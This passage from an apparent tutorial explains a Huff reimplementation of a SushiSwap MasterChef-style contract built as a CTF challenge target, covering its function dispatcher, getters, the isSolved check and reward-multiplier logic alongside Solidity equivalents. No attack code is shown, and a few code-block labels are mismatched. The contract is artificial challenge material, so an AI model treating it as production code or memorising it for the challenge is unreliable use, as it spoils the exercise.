</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(set)                   </span><span style=color:#a71d5d;font-weight:700>eq </span><span>set_jump                          </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(setMigrator)           </span><span style=color:#a71d5d;font-weight:700>eq </span><span>set_migrator_jump                 </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(migrate)               </span><span style=color:#a71d5d;font-weight:700>eq </span><span>migrate_jump                      </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(getMultiplier)         </span><span style=color:#a71d5d;font-weight:700>eq </span><span>get_multiplier_jump               </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(pendingSushi)          </span><span style=color:#a71d5d;font-weight:700>eq </span><span>pending_sushi_jump                </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(massUpdatePools)       </span><span style=color:#a71d5d;font-weight:700>eq </span><span>mass_update_pools_jump            </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(updatePool)            </span><span style=color:#a71d5d;font-weight:700>eq </span><span>update_pool_jump                  </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(deposit)               </span><span style=color:#a71d5d;font-weight:700>eq </span><span>deposit_jump                      </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(withdraw)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>withdraw_jump                     </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(emergencyWithdraw)     </span><span style=color:#a71d5d;font-weight:700>eq </span><span>emergency_withdraw_jump           </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(dev)                   </span><span style=color:#a71d5d;font-weight:700>eq </span><span>dev_jump                          </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(sushi)                 </span><span style=color:#a71d5d;font-weight:700>eq </span><span>sushi_jump                        </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(devaddr)               </span><span style=color:#a71d5d;font-weight:700>eq </span><span>devaddr_jump                      </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(bonusEndBlock)         </span><span style=color:#a71d5d;font-weight:700>eq </span><span>bonus_end_block_jump              </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(sushiPerBlock)         </span><span style=color:#a71d5d;font-weight:700>eq </span><span>sushi_per_block_jump              </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(BONUS_MULTIPLIER)      </span><span style=color:#a71d5d;font-weight:700>eq </span><span>bonus_multiplier_jump             </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(migrator)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>migrator_jump                     </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(poolInfo)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>pool_info_jump                    </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(userInfo)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>user_info_jump                    </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(totalAllocPoint)       </span><span style=color:#a71d5d;font-weight:700>eq </span><span>total_alloc_point_jump            </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(startBlock)            </span><span style=color:#a71d5d;font-weight:700>eq </span><span>start_block_jump                  </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(player)                </span><span style=color:#a71d5d;font-weight:700>eq </span><span>player_jump                       </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(isSolved)              </span><span style=color:#a71d5d;font-weight:700>eq </span><span>is_solved_jump                    </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#62a35c>OWNED_MAIN</span><span>()                           </span><span style=color:#969896;font-style:italic>// Check inherited Owned functions
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>dup1 revert                       </span><span style=color:#969896;font-style:italic>// No match found, revert
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Jump destinations - each invokes corresponding macro
</span><span>    pool_length_jump:
</span><span>        </span><span style=color:#62a35c>POOL_LENGTH</span><span>()
</span><span>    add_jump:
</span><span>        </span><span style=color:#62a35c>ADD</span><span>()
</span><span>    set_jump:
</span><span>        </span><span style=color:#62a35c>SET</span><span>()
</span><span>    set_migrator_jump:
</span><span>        </span><span style=color:#62a35c>SET_MIGRATOR</span><span>()
</span><span>    migrate_jump:
</span><span>        </span><span style=color:#62a35c>MIGRATE</span><span>()
</span><span>    get_multiplier_jump:
</span><span>        </span><span style=color:#62a35c>GET_MULTIPLIER</span><span>()
</span><span>    pending_sushi_jump:
</span><span>        </span><span style=color:#62a35c>PENDING_SUSHI</span><span>()
</span><span>    mass_update_pools_jump:
</span><span>        </span><span style=color:#62a35c>MASS_UPDATE_POOLS</span><span>()
</span><span>    update_pool_jump:
</span><span>        </span><span style=color:#62a35c>UPDATE_POOL</span><span>()
</span><span>    deposit_jump:
</span><span>        </span><span style=color:#62a35c>DEPOSIT</span><span>()
</span><span>    withdraw_jump:
</span><span>        </span><span style=color:#62a35c>WITHDRAW</span><span>()
</span><span>    emergency_withdraw_jump:
</span><span>        </span><span style=color:#62a35c>EMERGENCY_WITHDRAW</span><span>()
</span><span>    dev_jump:
</span><span>        </span><span style=color:#62a35c>DEV</span><span>()
</span><span>    sushi_jump:
</span><span>        </span><span style=color:#62a35c>SUSHI</span><span>()
</span><span>    devaddr_jump:
</span><span>        </span><span style=color:#62a35c>DEVADDR</span><span>()
</span><span>    bonus_end_block_jump:
</span><span>        </span><span style=color:#62a35c>BONUS_END_BLOCK</span><span>()
</span><span>    sushi_per_block_jump:
</span><span>        </span><span style=color:#62a35c>SUSHI_PER_BLOCK</span><span>()
</span><span>    bonus_multiplier_jump:
</span><span>        </span><span style=color:#62a35c>BONUS_MULTIPLIER</span><span>()
</span><span>    migrator_jump:
</span><span>        </span><span style=color:#62a35c>MIGRATOR</span><span>()
</span><span>    pool_info_jump:
</span><span>        </span><span style=color:#62a35c>POOL_INFO</span><span>()
</span><span>    user_info_jump:
</span><span>        </span><span style=color:#62a35c>USER_INFO</span><span>()
</span><span>    total_alloc_point_jump:
</span><span>        </span><span style=color:#62a35c>TOTAL_ALLOC_POINT</span><span>()
</span><span>    start_block_jump:
</span><span>        </span><span style=color:#62a35c>START_BLOCK</span><span>()
</span><span>    player_jump:
</span><span>        </span><span style=color:#62a35c>PLAYER</span><span>()
</span><span>    is_solved_jump:
</span><span>        </span><span style=color:#62a35c>IS_SOLVED</span><span>()
</span><span>}
</span></code></pre></div></div> In Solidity, the compiler automatically generates the function dispatcher. So we won't see the equivalent solidity code in the contract. <p><strong>Function Selection Flow:</strong><p>When a transaction was made to the smart contract the function selection logic will execute in the following flow.<ol><li>Transaction arrives with calldata: <code>0x949d225d0000...</code> (example)<li>MAIN macro extracts selector: <code>0x949d225d</code> (first 4 bytes)<li>Compares selector against each <code>__FUNC_SIG</code>: <ul><li><code>poolLength</code>  <code>0x081e3eda</code>  no match<li><code>add</code>  <code>0x1eaaa045</code>  no match<li>... continues checking ...<li><code>deposit</code>  <code>0x949d225d</code>  <strong>match found</strong></ul><li>Executes <code>jumpi</code> to <code>deposit_jump</code> label<li>Invokes <code>DEPOSIT()</code> macro to handle transaction<li>If no match found after all checks, reverts with <code>0x00 dup1 revert</code></ol><h3 id=functions>Functions</h3><h4 id=sushi-get-sushi-token-address>SUSHI() - Get Sushi Token Address</h4><p>Returns the address of the SUSHI reward token. This function introduces the <code>sload</code> opcode for reading from persistent storage and <code>mstore</code> for writing to memory before returning data. The <code>sload</code> opcode loads 32 bytes from a specified storage slot, while <code>mstore</code> writes 32 bytes to memory at a specified offset, preparing data for the <code>return</code> opcode.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: SUSHI()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SUSHI</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushi_address]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loads SUSHI token address from storage slot 0
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: sushi_address (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: devaddr()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sushi</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> sushi;
</span><span>}
</span></code></pre></div></div><p>The Solidity compiler handles storage access and return data formatting automatically, returning the state variable directly.<hr><h4 id=devaddr-get-developer-address>DEVADDR() - Get Developer Address</h4><p>Returns the address designated to receive developer fees from the protocol. This function follows the same pattern as SUSHI(), using <code>sload</code> to read from storage and <code>mstore</code>/<code>return</code> to format and return the data to the caller.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: SUSHI()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>DEVADDR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [devaddr_address]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loads developer address from storage slot 1
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: devaddr_address (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: devaddr()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>devaddr</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> devaddr;
</span><span>}
</span></code></pre></div></div><p>The Solidity compiler reads the state variable and handles the return data encoding automatically.<hr><h4 id=pool-length-get-total-number-of-pools>POOL_LENGTH() - Get Total Number of Pools</h4><p>Returns the total count of staking pools registered in the contract. Like the previous getters, this uses <code>sload</code> to retrieve the pool count from storage and returns it through memory.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: POOL_LENGTH()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>POOL_LENGTH</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_count]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loads total number of pools from storage slot 2
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: pool_count (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: poolLength()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>poolLength</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> poolInfo.</span><span style=color:#a71d5d;font-weight:700>length</span><span>;
</span><span>}
</span></code></pre></div></div><p>In Solidity, accessing a dynamic array's length property is a simple state read operation.<hr><h4 id=bonus-multiplier-get-bonus-multiplier-constant>BONUS_MULTIPLIER() - Get Bonus Multiplier Constant</h4><p>Returns a constant multiplier value used in reward calculations. Unlike previous functions that read from storage, this function returns a compile-time constant (10) by directly pushing the value onto the stack. The constant is defined as <code>BONUS_MULTIPLIER_CONSTANT</code> which expands to <code>0x0a</code> (10 in hexadecimal) during macro expansion.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: BONUS_MULTIPLIER()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>BONUS_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[BONUS_MULTIPLIER_CONSTANT] 0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Pushes constant value 0x0a (10) and stores to memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: 0x0a (32 bytes, padded)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: BONUS_MULTIPLIER()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>BONUS_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>10</span><span>;
</span><span>}
</span></code></pre></div></div><p>Solidity constants are inlined at compile time, eliminating storage reads.<hr><h4 id=player-get-player-address>PLAYER() - Get Player Address</h4><p>Returns the address of the player participating in the CTF challenge. This storage slot is initialized in the constructor and remains constant throughout the contract's lifetime.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: PLAYER()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>PLAYER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[PLAYER_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [player_address]
</span><span>    </span><span style=color:#969896;font-style:italic>// Loads player address from storage slot 3
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: player_address (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: player()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>player</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> player;
</span><span>}
</span></code></pre></div></div><p>Returns the immutable player address set during contract deployment.<hr><h4 id=is-solved-check-challenge-solution>IS_SOLVED() - Check Challenge Solution</h4><p>Verifies whether the player has successfully completed the CTF challenge by checking their SUSHI token balance. This function introduces several new concepts: the <code>gt</code> opcode performs greater-than comparison between two stack values, pushing 1 if the first is greater or 0 otherwise; <code>iszero</code> performs logical NOT, flipping 0 to 1 and any non-zero value to 0. The function also demonstrates external contract calls using the <code>ERC20_BALANCE_OF()</code> macro, which uses <code>staticcall</code> to query the player's token balance from the SUSHI contract. The challenge is considered solved when the player has accumulated more than 1,000,000 SUSHI tokens (1,000,000 * 10^18 in wei).<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: IS_SOLVED()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>IS_SOLVED</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [sushi_address]
</span><span>
</span><span>    </span><span style=color:#0086b3>[PLAYER_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [player_address, sushi_address]
</span><span>
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calls sushi.balanceOf(player) and stores result in memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: player_balance (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0xd3c21bcecceda1000000
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [1000000000000000000000000, balance]
</span><span>    </span><span style=color:#969896;font-style:italic>// Pushes threshold: 1,000,000 SUSHI (with 18 decimals)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>gt
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance > threshold ? 1 : 0]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [balance > threshold ? 0 : 1]
</span><span>    </span><span style=color:#969896;font-style:italic>// Inverts the comparison result
</span><span>
</span><span>    </span><span style=color:#0086b3>0x40 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x40]: comparison_result (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x40 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x40]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: isSolved()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> sushi.</span><span style=color:#62a35c>balanceOf</span><span>(player) </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>1_000_000 </span><span style=color:#a71d5d;font-weight:700>*</span><span> 1e18;
</span><span>}
</span></code></pre></div></div><p>The Solidity version abstracts away the manual memory management and external call encoding.<hr><h4 id=get-multiplier-calculate-reward-multiplier>GET_MULTIPLIER() - Calculate Reward Multiplier</h4><p>Calculates the reward multiplier between two block numbers, applying a bonus multiplier during the bonus period. The function uses the <code>INNER_GET_MULTIPLIER()</code> helper macro which implements three distinct cases: if the entire range falls within the bonus period (to  bonusEndBlock), it applies the bonus multiplier to the full range; if the range is entirely after the bonus period (from  bonusEndBlock), it returns the simple block difference; if the range spans across the bonus end block, it splits the calculation, applying the bonus multiplier to blocks before bonusEndBlock and regular 1 multiplier to blocks after. This introduces the <code>jumpi</code> opcode for conditional jumps based on stack comparisons, and demonstrates how complex branching logic is implemented in low-level EVM code.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: GET_MULTIPLIER()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>GET_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [from_block]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [to_block, from_block]
</span><span>
</span><span>    </span><span style=color:#62a35c>INNER_GET_MULTIPLIER</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [multiplier_result]
</span><span>    </span><span style=color:#969896;font-style:italic>// Expands to inline multiplier calculation logic below
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: multiplier_result (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 32 bytes from memory[0x00]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>// INNER_GET_MULTIPLIER() expansion: takes(2) returns(1)
</span><span style=color:#969896;font-style:italic>// Input stack: [to, from]
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>INNER_GET_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>2</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>1</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [to, from]
</span><span>    </span><span style=color:#0086b3>[BONUS_END_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [bonusEndBlock, to, from]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup3 gt
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [to > bonusEndBlock, bonusEndBlock, to, from]
</span><span>
</span><span>    to_is_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// If to > bonusEndBlock, jump. Otherwise fall through to Case 1.
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [to, from]
</span><span>        </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [to - from]
</span><span>        </span><span style=color:#0086b3>[BONUS_MULTIPLIER_CONSTANT] </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [(to - from) * BONUS_MULTIPLIER]
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>
</span><span>    to_is_bigger_jump:
